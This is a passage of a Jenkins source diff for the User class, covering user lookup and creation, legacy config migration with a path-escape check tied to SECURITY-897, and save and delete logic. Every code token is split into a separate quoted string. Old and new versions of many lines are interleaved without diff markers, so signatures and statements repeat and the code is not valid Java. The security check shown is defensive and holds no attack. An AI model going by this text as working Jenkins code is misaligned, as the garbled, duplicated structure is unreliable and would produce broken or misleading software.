"Throwable", "(", "))", ";", "}", "}", "else", "if", "(", "!", "id", ".", "equals", "(", "fullName", ")", "&", "&", "!", "configFile", ".", "exists", "(", "))", "{", "/", "/", "JENKINS", "-", "16332", ":", "since", "the", "fullName", "may", "not", "be", "recoverable", "from", "the", "id", ",", "and", "various", "code", "may", "store", "the", "id", "only", ",", "we", "must", "save", "the", "fullName", "private", "static", "@", "Nullable", "User", "getOrCreateById", "(", "@", "Nonnull", "String", "id", ",", "@", "Nonnull", "String", "fullName", ",", "boolean", "create", ")", "{", "User", "u", "=", "AllUsers", ".", "get", "(", "id", ")", ";", "if", "(", "u", "=", "=", "null", "&", "&", "(", "create", "|", "|", "UserIdMapper", ".", "getInstance", "(", ").", "isMapped", "(", "id", ")", "))", "{", "u", "=", "new", "User", "(", "id", ",", "fullName", ")", ";", "AllUsers", ".", "put", "(", "id", ",", "u", ")", ";", "if", "(", "!", "id", ".", "equals", "(", "fullName", ")", "&", "&", "!", "UserIdMapper", ".", "getInstance", "(", ").", "isMapped", "(", "id", ")", ")", "{", "try", "{", "u", ".", "save", "(", ");", "}", "catch", "(", "IOException", "x", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "null", ",", "x", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Failed", "to", "save", "user", "configuration", "for", "\"", "+", "id", ",", "x", ")", ";", "}", "}", "}", "return", "u", ";", "}", "private", "static", "boolean", "isMigrationRequiredForLegacyConfigFile", "(", "@", "Nonnull", "File", "legacyConfigFile", ",", "@", "Nonnull", "File", "newConfigFile", ")", "{", "boolean", "mustMigrateLegacyConfig", "=", "legacyConfigFile", ".", "exists", "(", ")", "&", "&", "!", "legacyConfigFile", ".", "equals", "(", "newConfigFile", ")", ";", "if", "(", "mustMigrateLegacyConfig", ")", "{", "try", "{", "/", "/", "TODO", "Could", "be", "replace", "by", "Util", ".", "isDescendant", "(", "getRootDir", "(", "),", "legacyConfigFile", ")", "in", "2", ".", "80", "+", "String", "canonicalLegacy", "=", "legacyConfigFile", ".", "getCanonicalPath", "(", ");", "String", "canonicalUserDir", "=", "getRootDir", "(", ").", "getCanonicalPath", "(", ");", "if", "(", "!", "canonicalLegacy", ".", "startsWith", "(", "canonicalUserDir", "+", "File", ".", "separator", ")", "){", "/", "/", "without", "that", "check", ",", "the", "application", "config", ".", "xml", "could", "be", "moved", "(", "i", ".", "e", ".", "erased", "from", "application", "PoV", ")", "mustMigrateLegacyConfig", "=", "false", ";", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "String", ".", "format", "(", "\"", "Attempt", "to", "escape", "from", "users", "directory", "with", "%", "s", ",", "migration", "aborted", ",", "see", "SECURITY", "-", "897", "for", "more", "information", "\"", ",", "legacyConfigFile", ".", "getAbsolutePath", "(", ")", ")", ");", "}", "}", "catch", "(", "IOException", "e", ")", "{", "mustMigrateLegacyConfig", "=", "false", ";", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "String", ".", "format", "(", "\"", "Failed", "to", "determine", "the", "canonical", "path", "of", "%", "s", ",", "migration", "aborted", ",", "see", "SECURITY", "-", "897", "for", "more", "information", "\"", ",", "legacyConfigFile", ".", "getAbsolutePath", "(", ")", ")", ",", "e", ")", ";", "}", "}", "return", "mustMigrateLegacyConfig", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "by", "its", "id", "or", "full", "name", ".", "*", "*", "<", "p", ">", "*", "Creates", "a", "user", "on", "-", "demand", ".", "*", "*", "<", "p", ">", "@", "@", "-", "602", ",", "18", "+", "545", ",", "19", "@", "@", "private", "static", "boolean", "isMigrationRequiredForLegacyConfigFile", "(", "@", "Nonnull", "File", "lega", "*", "This", "is", "slow", "(", "see", "JENKINS", "-", "23281", ")", ".", "*", "*", "@", "deprecated", "This", "method", "is", "deprecated", ",", "because", "it", "causes", "unexpected", "{", "@", "link", "User", "}", "creation", "*", "by", "API", "usage", "code", "and", "causes", "performance", "degradation", "of", "used", "to", "retrieve", "users", "by", "ID", ".", "*", "Use", "{", "@", "link", "#", "getById", "}", "when", "you", "know", "you", "have", "an", "ID", ".", "*", "Otherwise", "use", "{", "@", "link", "#", "getOrCreateByIdOrFullName", "(", "String", ")", "}", "or", "{", "@", "link", "#", "get", "(", "String", ",", "boolean", ",", "Map", ")", "}.", "*", "by", "API", "usage", "code", "and", "causes", "performance", "degradation", "of", "used", "to", "retrieve", "users", "by", "ID", ".", "*", "Use", "{", "@", "link", "#", "getById", "}", "when", "you", "know", "you", "have", "an", "ID", ".", "*", "Otherwise", "use", "{", "@", "link", "#", "getOrCreateByIdOrFullName", "(", "String", ")", "}", "or", "{", "@", "link", "#", "get", "(", "String", ",", "boolean", ",", "Map", ")", "}.", "*", "/", "@", "Deprecated", "public", "static", "@", "Nonnull", "User", "get", "(", "String", "idOrFullName", ")", "{", "public", "static", "@", "Nonnull", "User", "get", "(", "String", "idOrFullName", ")", "{", "return", "getOrCreateByIdOrFullName", "(", "idOrFullName", ")", ";", "}", "/", "**", "*", "Get", "the", "user", "by", "ID", "or", "Full", "Name", ".", "*", "*", "<", "p", ">", "*", "If", "the", "user", "does", "not", "exist", ",", "creates", "a", "new", "one", "on", "-", "demand", ".", "*", "*", "<", "p", ">", "@", "@", "-", "627", ",", "137", "+", "571", ",", "105", "@", "@", "private", "static", "boolean", "isMigrationRequiredForLegacyConfigFile", "(", "@", "Nonnull", "File", "lega", "*", "@", "since", "2", ".", "91", "*", "/", "public", "static", "@", "Nonnull", "User", "getOrCreateByIdOrFullName", "(", "@", "Nonnull", "String", "idOrFullName", ")", "{", "return", "get", "(", "idOrFullName", ",", "true", ",", "Collections", ".", "emptyMap", "(", "))", ";", "return", "get", "(", "idOrFullName", ",", "true", ",", "Collections", ".", "emptyMap", "(", "))", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "representing", "the", "currently", "logged", "-", "in", "user", ",", "or", "null", "*", "if", "the", "current", "user", "is", "anonymous", ".", "*", "*", "@", "since", "1", ".", "172", "*", "/", "public", "static", "@", "CheckForNull", "User", "current", "(", ")", "{", "public", "static", "@", "CheckForNull", "User", "current", "(", ")", "{", "return", "get", "(", "Jenkins", ".", "getAuthentication", "(", "))", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "representing", "the", "supplied", "{", "@", "link", "Authentication", "}", "or", "*", "{", "@", "code", "null", "}", "if", "the", "supplied", "{", "@", "link", "Authentication", "}", "is", "either", "anonymous", "or", "{", "@", "code", "null", "}", "*", "*", "@", "param", "a", "the", "supplied", "{", "@", "link", "Authentication", "}", ".", "*", "@", "return", "a", "{", "@", "link", "User", "}", "object", "for", "the", "supplied", "{", "@", "link", "Authentication", "}", "or", "{", "@", "code", "null", "}", "*", "@", "since", "1", ".", "609", "*", "/", "public", "static", "@", "CheckForNull", "User", "get", "(", "@", "CheckForNull", "Authentication", "a", ")", "{", "if", "(", "a", "=", "=", "null", "|", "|", "a", "instanceof", "AnonymousAuthenticationToken", ")", "public", "static", "@", "CheckForNull", "User", "get", "(", "@", "CheckForNull", "Authentication", "a", ")", "{", "if", "(", "a", "=", "=", "null", "|", "|", "a", "instanceof", "AnonymousAuthenticationToken", ")", "return", "null", ";", "/", "/", "Since", "we", "already", "know", "this", "is", "a", "name", ",", "we", "can", "just", "call", "getOrCreate", "with", "the", "name", "directly", ".", "String", "id", "=", "a", ".", "getName", "(", ");", "return", "getById", "(", "id", ",", "true", ")", ";", "/", "/", "Since", "we", "already", "know", "this", "is", "a", "name", ",", "we", "can", "just", "call", "getOrCreateById", "with", "the", "name", "directly", ".", "return", "getById", "(", "a", ".", "getName", "(", "),", "true", ")", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "by", "its", "<", "code", ">", "id", "<", "/", "code", ">", "*", "*", "@", "param", "id", "*", "the", "id", "of", "the", "user", "to", "retrieve", "and", "optionally", "create", "if", "it", "does", "not", "exist", ".", "*", "@", "param", "create", "*", "If", "<", "code", ">", "true", "<", "/", "code", ">", ",", "this", "method", "will", "never", "return", "<", "code", ">", "null", "<", "/", "code", ">", "for", "valid", "input", "(", "by", "creating", "a", "*", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "If", "<", "code", ">", "false", "<", "/", "code", ">", ",", "this", "method", "will", "return", "*", "<", "code", ">", "null", "<", "/", "code", ">", "if", "{", "@", "link", "User", "}", "object", "with", "the", "given", "id", "doesn", "'", "t", "exist", ".", "*", "@", "param", "id", "the", "id", "of", "the", "user", "to", "retrieve", "and", "optionally", "create", "if", "it", "does", "not", "exist", ".", "*", "@", "param", "create", "If", "<", "code", ">", "true", "<", "/", "code", ">", ",", "this", "method", "will", "never", "return", "<", "code", ">", "null", "<", "/", "code", ">", "for", "valid", "input", "(", "by", "creating", "a", "*", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "If", "<", "code", ">", "false", "<", "/", "code", ">", ",", "this", "method", "will", "return", "*", "<", "code", ">", "null", "<", "/", "code", ">", "if", "{", "@", "link", "User", "}", "object", "with", "the", "given", "id", "doesn", "'", "t", "exist", ".", "*", "@", "return", "the", "a", "User", "whose", "id", "is", "<", "code", ">", "id", "<", "/", "code", ">", ",", "or", "<", "code", ">", "null", "<", "/", "code", ">", "if", "<", "code", ">", "create", "<", "/", "code", ">", "is", "<", "code", ">", "false", "<", "/", "code", ">", "*", "and", "the", "user", "does", "not", "exist", ".", "*", "and", "the", "user", "does", "not", "exist", ".", "*", "@", "since", "1", ".", "651", ".", "2", "/", "2", ".", "3", "*", "/", "public", "static", "@", "Nullable", "User", "getById", "(", "String", "id", ",", "boolean", "create", ")", "{", "return", "getOrCreate", "(", "id", ",", "id", ",", "create", ")", ";", "public", "static", "@", "Nullable", "User", "getById", "(", "String", "id", ",", "boolean", "create", ")", "{", "return", "getOrCreateById", "(", "id", ",", "id", ",", "create", ")", ";", "}", "/", "**", "*", "Gets", "all", "the", "users", ".", "*", "/", "public", "static", "@", "Nonnull", "Collection", "<", "User", ">", "getAll", "(", ")", "{", "public", "static", "@", "Nonnull", "Collection", "<", "User", ">", "getAll", "(", ")", "{", "final", "IdStrategy", "strategy", "=", "idStrategy", "(", ");", "byNameLock", ".", "readLock", "(", ").", "lock", "(", ");", "ArrayList", "<", "User", ">", "r", ";", "try", "{", "r", "=", "new", "ArrayList", "<", "User", ">", "(", "AllUsers", ".", "byName", "(", ").", "values", "(", "))", ";", "}", "finally", "{", "byNameLock", ".", "readLock", "(", ").", "unlock", "(", ");", "}", "Collections", ".", "sort", "(", "r", ",", "new", "Comparator", "<", "User", ">", "()", "{", "public", "int", "compare", "(", "User", "o1", ",", "User", "o2", ")", "{", "return", "strategy", ".", "compare", "(", "o1", ".", "getId", "(", "),", "o2", ".", "getId", "(", "))", ";", "}", "}", ");", "return", "r", ";", "ArrayList", "<", "User", ">", "users", "=", "new", "ArrayList", "<", ">(", "AllUsers", ".", "values", "(", "))", ";", "users", ".", "sort", "(", "(", "o1", ",", "o2", ")", "-", ">", "strategy", ".", "compare", "(", "o1", ".", "getId", "(", "),", "o2", ".", "getId", "(", "))", ");", "return", "users", ";", "}", "/", "**", "*", "To", "be", "called", "from", "{", "@", "link", "Jenkins", "#", "reload", "}", "only", ".", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "void", "reload", "(", ")", "{", "byNameLock", ".", "readLock", "(", ").", "lock", "(", ");", "try", "{", "AllUsers", ".", "byName", "(", ").", "clear", "(", ");", "}", "finally", "{", "byNameLock", ".", "readLock", "(", ").", "unlock", "(", ");", "}", "UserDetailsCache", ".", "get", "(", ").", "invalidateAll", "(", ");", "AllUsers", ".", "scanAll", "(", ");", "}", "/", "**", "*", "@", "deprecated", "Used", "to", "be", "called", "by", "test", "harnesses", ";", "now", "ignored", "in", "that", "case", ".", "*", "/", "@", "Deprecated", "public", "static", "void", "clear", "(", ")", "{", "if", "(", "ExtensionList", ".", "lookup", "(", "AllUsers", ".", "class", ")", ".", "isEmpty", "(", "))", "{", "/", "/", "Historically", "this", "was", "called", "by", "JenkinsRule", "prior", "to", "startup", ".", "Ignore", "!", "return", ";", "}", "byNameLock", ".", "writeLock", "(", ").", "lock", "(", ");", "try", "{", "AllUsers", ".", "byName", "(", ").", "clear", "(", ");", "}", "finally", "{", "byNameLock", ".", "writeLock", "(", ").", "unlock", "(", ");", "}", "public", "static", "void", "reload", "(", ")", "throws", "IOException", "{", "UserIdMapper", ".", "getInstance", "(", ").", "reload", "(", ");", "AllUsers", ".", "reload", "(", ");", "}", "/", "**", "*", "Called", "when", "changing", "the", "{", "@", "link", "IdStrategy", "}", ".", "*", "*", "@", "since", "1", ".", "566", "*", "/", "public", "static", "void", "rekey", "(", ")", "{", "final", "IdStrategy", "strategy", "=", "idStrategy", "(", ");", "byNameLock", ".", "writeLock", "(", ").", "lock", "(", ");", "/", "*", "There", "are", "many", "and", "varied", "ways", "in", "which", "this", "could", "cause", "erratic", "or", "problematic", "behavior", ".", "Such", "changes", "should", "really", "only", "occur", "during", "initial", "setup", "and", "under", "very", "controlled", "situations", ".", "After", "this", "sort", "of", "a", "change", "the", "whole", "webapp", "should", "restart", ".", "It", "'", "s", "possible", "that", "this", "rekeying", ",", "or", "greater", "issues", "in", "the", "realm", "change", ",", "could", "affect", "currently", "logged", "in", "users", "and", "even", "the", "user", "making", "the", "change", ".", "*", "/", "try", "{", "ConcurrentMap", "<", "String", ",", "User", ">", "byName", "=", "AllUsers", ".", "byName", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "User", ">", "e", ":", "byName", ".", "entrySet", "(", "))", "{", "String", "idkey", "=", "strategy", ".", "keyFor", "(", "e", ".", "getValue", "(", ").", "id", ")", ";", "if", "(", "!", "idkey", ".", "equals", "(", "e", ".", "getKey", "(", "))", ")", "{", "/", "/", "need", "to", "remap", "byName", ".", "remove", "(", "e", ".", "getKey", "(", "))", ";", "byName", ".", "putIfAbsent", "(", "idkey", ",", "e", ".", "getValue", "(", "))", ";", "}", "}", "}", "finally", "{", "byNameLock", ".", "writeLock", "(", ").", "unlock", "(", ");", "UserDetailsCache", ".", "get", "(", ").", "invalidateAll", "(", ");", "reload", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Failed", "to", "perform", "rekey", "operation", ".", "\",", "e", ")", ";", "}", "}", "/", "**", "*", "Returns", "the", "user", "name", ".", "*", "/", "public", "@", "Nonnull", "String", "getDisplayName", "(", ")", "{", "public", "@", "Nonnull", "String", "getDisplayName", "(", ")", "{", "return", "getFullName", "(", ");", "}", "/", "**", "true", "if", "{", "@", "link", "AbstractBuild", "#", "hasParticipant", "}", "or", "{", "@", "link", "hudson", ".", "model", ".", "Cause", ".", "UserIdCause", "}", "*", "/", "private", "boolean", "relatedTo", "(", "@", "Nonnull", "AbstractBuild", "<", "?,", "?>", "b", ")", "{", "/", "**", "*", "true", "if", "{", "@", "link", "AbstractBuild", "#", "hasParticipant", "}", "or", "{", "@", "link", "hudson", ".", "model", ".", "Cause", ".", "UserIdCause", "}", "*", "/", "private", "boolean", "relatedTo", "(", "@", "Nonnull", "AbstractBuild", "<", "?,", "?", ">", "b", ")", "{", "if", "(", "b", ".", "hasParticipant", "(", "this", ")", ")", "{", "return", "true", ";", "}", "@", "@", "-", "778", ",", "50", "+", "690", ",", "64", "@", "@", "private", "boolean", "relatedTo", "(", "@", "Nonnull", "AbstractBuild", "<", "?,", "?>", "b", ")", "{", "*", "/", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "@", "WithBridgeMethods", "(", "List", ".", "class", ")", "public", "@", "Nonnull", "RunList", "getBuilds", "(", ")", "{", "return", "RunList", ".", "fromJobs", "(", "(", "Iterable", ")", "Jenkins", ".", "getInstance", "(", ").", "allItems", "(", "Job", ".", "class", ")", ").", "filter", "(", "new", "Predicate", "<", "Run", "<", "?,", "?>", ">(", ")", "{", "@", "Override", "public", "boolean", "apply", "(", "Run", "<", "?,", "?>", "r", ")", "{", "return", "r", "instanceof", "AbstractBuild", "&", "&", "relatedTo", "(", "(", "AbstractBuild", "<", "?,", "?>", ")", "r", ")", ";", "}", "}", ");", "public", "@", "Nonnull", "RunList", "getBuilds", "(", ")", "{", "return", "RunList", ".", "fromJobs", "(", "(", "Iterable", ")", "Jenkins", ".", "get", "(", ").", "allItems", "(", "Job", ".", "class", ")", ").", "filter", "(", "(", "Predicate", "<", "Run", "<", "?,", "?", ">>", ")", "r", "-", ">", "r", "instanceof", "AbstractBuild", "&", "&", "relatedTo", "(", "(", "AbstractBuild", "<", "?,", "?", ">)", "r", ")", ");", "}", "/", "**", "*", "Gets", "all", "the", "{", "@", "link", "AbstractProject", "}", "s", "that", "this", "user", "has", "committed", "to", ".", "*", "*", "@", "since", "1", ".", "191", "*", "/", "public", "@", "Nonnull", "Set", "<", "AbstractProject", "<", "?,", "?>", ">", "getProjects", "(", ")", "{", "Set", "<", "AbstractProject", "<", "?,", "?>", ">", "r", "=", "new", "HashSet", "<", "AbstractProject", "<", "?,", "?>", ">(", ");", "for", "(", "AbstractProject", "<", "?,", "?>", "p", ":", "Jenkins", ".", "getInstance", "(", ").", "allItems", "(", "AbstractProject", ".", "class", ")", ")", "if", "(", "p", ".", "hasParticipant", "(", "this", ")", ")", "public", "@", "Nonnull", "Set", "<", "AbstractProject", "<", "?,", "?", ">>", "getProjects", "(", ")", "{", "Set", "<", "AbstractProject", "<", "?,", "?", ">>", "r", "=", "new", "HashSet", "<", ">(", ");", "for", "(", "AbstractProject", "<", "?,", "?", ">", "p", ":", "Jenkins", ".", "get", "(", ").", "allItems", "(", "AbstractProject", ".", "class", ")", ")", "if", "(", "p", ".", "hasParticipant", "(", "this", ")", ")", "r", ".", "add", "(", "p", ")", ";", "return", "r", ";", "}", "public", "@", "Override", "String", "toString", "(", ")", "{", "public", "@", "Override", "String", "toString", "(", ")", "{", "return", "fullName", ";", "}", "/", "**", "*", "The", "file", "we", "save", "our", "configuration", ".", "*", "Called", "by", "tests", "in", "the", "JTH", ".", "Otherwise", "this", "shouldn", "'", "t", "be", "called", ".", "*", "Even", "in", "the", "tests", "this", "usage", "is", "questionable", ".", "*", "/", "protected", "final", "XmlFile", "getConfigFile", "(", ")", "{", "return", "new", "XmlFile", "(", "XSTREAM", ",", "getConfigFileFor", "(", "id", ")", ");", "@", "Deprecated", "public", "static", "void", "clear", "(", ")", "{", "if", "(", "ExtensionList", ".", "lookup", "(", "AllUsers", ".", "class", ")", ".", "isEmpty", "(", "))", "{", "return", ";", "}", "UserIdMapper", ".", "getInstance", "(", ").", "clear", "(", ");", "AllUsers", ".", "clear", "(", ");", "}", "private", "static", "final", "File", "getConfigFileFor", "(", "String", "id", ")", "{", "return", "new", "File", "(", "getRootDir", "(", "),", "idStrategy", "(", ").", "filenameOf", "(", "id", ")", "+", "\"/", "config", ".", "xml", "\"", ");", "/", "**", "*", "Returns", "the", "folder", "that", "store", "all", "the", "user", "information", ".", "*", "Useful", "for", "plugins", "to", "save", "a", "user", "-", "specific", "file", "aside", "the", "config", ".", "xml", ".", "*", "Exposes", "implementation", "details", "that", "may", "be", "subject", "to", "change", ".", "*", "*", "@", "since", "2", ".", "129", "*", "/", "public", "File", "getUserFolder", "(", ")", "{", "return", "getExistingUserFolder", "(", ");", "}", "private", "static", "File", "getUnsanitizedLegacyConfigFileFor", "(", "String", "id", ")", "{", "return", "new", "File", "(", "getRootDir", "(", "),", "idStrategy", "(", ").", "legacyFilenameOf", "(", "id", ")", "+", "\"", "/", "config", ".", "xml", "\"", ");", "private", "File", "getExistingUserFolder", "(", ")", "{", "return", "UserIdMapper", ".", "getInstance", "(", ").", "getDirectory", "(", "id", ")", ";", "}", "/", "**", "*", "Gets", "the", "directory", "where", "Hudson", "stores", "user", "information", ".", "*", "/", "private", "static", "File", "getRootDir", "(", ")", "{", "return", "new", "File", "(", "Jenkins", ".", "getInstance", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "static", "File", "getRootDir", "(", ")", "{", "return", "new", "File", "(", "Jenkins", ".", "get", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "}", "/", "**", "@", "@", "-", "834", ",", "12", "+", "760", ",", "11", "@", "@", "private", "static", "File", "getRootDir", "(", ")", "{", "*", "*", "@", "param", "id", "ID", "to", "be", "checked", "*", "@", "return", "{", "@", "code", "true", "}", "if", "the", "username", "or", "fullname", "is", "valid", ".", "*", "For", "{", "@", "code", "null", "}", "or", "blank", "IDs", "returns", "{", "@", "code", "false", "}", ".", "*", "For", "{", "@", "code", "null", "}", "or", "blank", "IDs", "returns", "{", "@", "code", "false", "}", ".", "*", "@", "since", "1", ".", "600", "*", "/", "public", "static", "boolean", "isIdOrFullnameAllowed", "(", "@", "CheckForNull", "String", "id", ")", "{", "/", "/", "TODO", ":", "StringUtils", ".", "isBlank", "(", ")", "checks", "the", "null", "value", ",", "but", "FindBugs", "is", "not", "smart", "enough", ".", "Remove", "it", "later", "if", "(", "id", "=", "=", "null", "|", "|", "StringUtils", ".", "isBlank", "(", "id", ")", ")", "{", "if", "(", "StringUtils", ".", "isBlank", "(", "id", ")", ")", "{", "return", "false", ";", "}", "final", "String", "trimmedId", "=", "id", ".", "trim", "(", ");", "@", "@", "-", "851", ",", "49", "+", "776", ",", "49", "@", "@", "public", "static", "boolean", "isIdOrFullnameAllowed", "(", "@", "CheckForNull", "String", "id", ")", "{", "}", "/", "**", "*", "Save", "the", "settings", "to", "a", "file", ".", "*", "Save", "the", "user", "configuration", ".", "*", "/", "public", "synchronized", "void", "save", "(", ")", "throws", "IOException", ",", "FormValidation", "{", "if", "(", "!", "isIdOrFullnameAllowed", "(", "id", ")", ")", "{", "public", "synchronized", "void", "save", "(", ")", "throws", "IOException", "{", "if", "(", "!", "isIdOrFullnameAllowed", "(", "id", ")", ")", "{", "throw", "FormValidation", ".", "error", "(", "Messages", ".", "User_IllegalUsername", "(", "id", ")", ");", "}", "if", "(", "!", "isIdOrFullnameAllowed", "(", "fullName", ")", ")", "{", "if", "(", "!", "isIdOrFullnameAllowed", "(", "fullName", ")", ")", "{", "throw", "FormValidation", ".", "error", "(", "Messages", ".", "User_IllegalFullname", "(", "fullName", ")", ");", "}", "if", "(", "BulkChange", ".", "contains", "(", "this", ")", ")", "return", ";", "getConfigFile", "(", ").", "write", "(", "this", ")", ";", "SaveableListener", ".", "fireOnChange", "(", "this", ",", "getConfigFile", "(", "))", ";", "if", "(", "BulkChange", ".", "contains", "(", "this", ")", ")", "{", "return", ";", "}", "XmlFile", "xmlFile", "=", "new", "XmlFile", "(", "XSTREAM", ",", "constructUserConfigFile", "(", "))", ";", "xmlFile", ".", "write", "(", "this", ")", ";", "SaveableListener", ".", "fireOnChange", "(", "this", ",", "xmlFile", ")", ";", "}", "private", "Object", "writeReplace", "(", ")", "{", "return", "XmlFile", ".", "replaceIfNotAtTopLevel", "(", "this", ",", "(", ")", "-", ">", "new", "Replacer", "(", "this", ")", ");", "private", "File", "constructUserConfigFile", "(", ")", "throws", "IOException", "{", "return", "new", "File", "(", "putUserFolderIfAbsent", "(", "),", "CONFIG_XML", ")", ";", "}", "private", "static", "class", "Replacer", "{", "private", "final", "String", "id", ";", "Replacer", "(", "User", "u", ")", "{", "id", "=", "u", ".", "getId", "(", ");", "}", "private", "Object", "readResolve", "(", ")", "{", "return", "getById", "(", "id", ",", "false", ")", ";", "}", "private", "File", "putUserFolderIfAbsent", "(", ")", "throws", "IOException", "{", "return", "UserIdMapper", ".", "getInstance", "(", ").", "putIfAbsent", "(", "id", ",", "true", ")", ";", "}", "/", "**", "*", "Deletes", "the", "data", "directory", "and", "removes", "this", "user", "from", "Hudson", ".", "*", "*", "@", "throws", "IOException", "*", "if", "we", "fail", "to", "delete", ".", "*", "@", "throws", "IOException", "if", "we", "fail", "to", "delete", ".", "*", "/", "public", "synchronized", "void", "delete", "(", ")", "throws", "IOException", "{", "final", "IdStrategy", "strategy", "=", "idStrategy", "(", ");", "byNameLock", ".", "readLock", "(", ").", "lock", "(", ");", "try", "{", "AllUsers", ".", "byName", "(", ").", "remove", "(", "strategy", ".", "keyFor", "(", "id", ")", ");", "}", "finally", "{", "byNameLock", ".", "readLock", "(", ").", "unlock", "(", ");", "public", "void", "delete", "(", ")", "throws", "IOException", "{", "String", "idKey", "=", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ";", "File", "existingUserFolder", "=", "getExistingUserFolder", "(", ");", "UserIdMapper", ".", "getInstance", "(", ").", "remove", "(", "id", ")", ";", "AllUsers", ".", "remove", "(", "id", ")", ";", "deleteExistingUserFolder", "(", "existingUserFolder", ")", ";", "UserDetailsCache", ".", "get", "(", ").", "invalidate", "(", "idKey", ")", ";", "}", "private", "void", "deleteExistingUserFolder", "(", "File", "existingUserFolder", ")", "throws", "IOException", "{", "if", "(", "existingUserFolder", "!", "=", "null", "&", "&", "existingUserFolder", ".", "exists", "(", "))", "{", "Util", ".", "deleteRecursive", "(", "existingUserFolder", ")", ";", "}", "Util", ".", "deleteRecursive", "(", "new", "File", "(", "getRootDir", "(", "),", "strategy", ".", "filenameOf", "(", "id", ")", "))", ";", "UserDetailsCache", ".", "get", "(", ").", "invalidate", "(", "strategy", ".", "keyFor", "(", "id", ")", ");", "}", "/", "**", "@", "@", "-", "907", ",", "21", "+", "832", ",", "21", "@", "@", "public", "Api", "getApi", "(", ")", "{", "*", "Accepts", "submission", "from", "the", "configuration", "page", ".", "*", "/", "@", "RequirePOST", "public", "void", "doConfigSubmit", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", ",", "FormException", "{", "public", "void", "doConfigSubmit", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", ",", "FormException", "{", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "JSONObject", "json", "=", "req", ".", "getSubmittedForm", "(", ");", "String", "oldFullName", "=", "this", ".", "fullName", ";", "fullName", "=", "json", ".", "getString", "(", "\"", "fullName", "\"", ");", "description", "=", "json", ".", "getString", "(", "\"", "description", "\"", ");", "List", "<", "UserProperty", ">", "props", "=", "new", "ArrayList", "<", "UserProperty", ">", "()", ";", "List", "<", "UserProperty", ">", "props", "=", "new", "ArrayList", "<", ">(", ");", "int", "i", "=", "0", ";", "for", "(", "UserPropertyDescriptor", "d", ":", "UserProperty", ".", "all", "(", "))", "{", "UserProperty", "p", "=", "getProperty", "(", "d", ".", "clazz", ")", ";", "JSONObject", "o", "=", "json", ".", "optJSONObject", "(", "\"", "userProperty", "\"", "+", "(", "i", "+", "+)", ");", "if", "(", "o", "!", "=", "null", ")", "{", "if", "(", "o", "!", "=", "null", ")", "{", "if", "(", "p", "!", "=", "null", ")", "{", "p", "=", "p", ".", "reconfigure", "(", "req", ",", "o", ")", ";", "}", "else", "{", "@", "@", "-", "930", ",", "7", "+", "855", ",", "7", "@", "@", "public", "void", "doConfigSubmit", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOE", "p", ".", "setUser", "(", "this", ")", ";", "}", "if", "(", "p", "!", "=", "null", ")", "if", "(", "p", "!", "=", "null", ")", "props", ".", "add", "(", "p", ")", ";", "}", "this", ".", "properties", "=", "props", ";", "@", "@", "-", "941", ",", "14", "+", "866", ",", "14", "@", "@", "public", "void", "doConfigSubmit", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOE", "UserDetailsCache", ".", "get", "(", ").", "invalidate", "(", "oldFullName", ")", ";", "}", "FormApply", ".", "success", "(", "\".", "\")", ".", "generateResponse", "(", "req", ",", "rsp", ",", "this", ")", ";", "FormApply", ".", "success", "(", "\".", "\")", ".", "generateResponse", "(", "req", ",", "rsp", ",", "this", ")", ";", "}", "/", "**", "*", "Deletes", "this", "user", "from", "Hudson", ".", "*", "/", "@", "RequirePOST", "public", "void", "doDoDelete", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", "{", "public", "void", "doDoDelete", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", "{", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "if", "(", "idStrategy", "(", ").", "equals", "(", "id", ",", "Jenkins", ".", "getAuthentication", "(", ").", "getName", "(", "))", ")", "{", "rsp", ".", "sendError", "(", "HttpServletResponse", ".", "SC_BAD_REQUEST", ",", "\"", "Cannot", "delete", "self", "\"", ");", "@", "@", "-", "969", ",", "9", "+", "894", ",", "9", "@", "@", "public", "void", "doRssFailed", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOExcept", "}", "public", "void", "doRssLatest", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", "{", "final", "List", "<", "Run", ">", "lastBuilds", "=", "new", "ArrayList", "<", "Run", ">", "()", ";", "for", "(", "AbstractProject", "<", "?,", "?>", "p", ":", "Jenkins", ".", "getInstance", "(", ").", "allItems", "(", "AbstractProject", ".", "class", ")", ")", "{", "for", "(", "AbstractBuild", "<", "?,", "?>", "b", "=", "p", ".", "getLastBuild", "(", ");", "b", "!", "=", "null", ";", "b", "=", "b", ".", "getPreviousBuild", "(", "))", "{", "final", "List", "<", "Run", ">", "lastBuilds", "=", "new", "ArrayList", "<", ">(", ");", "for", "(", "AbstractProject", "<", "?,", "?", ">", "p", ":", "Jenkins", ".", "get", "(", ").", "allItems", "(", 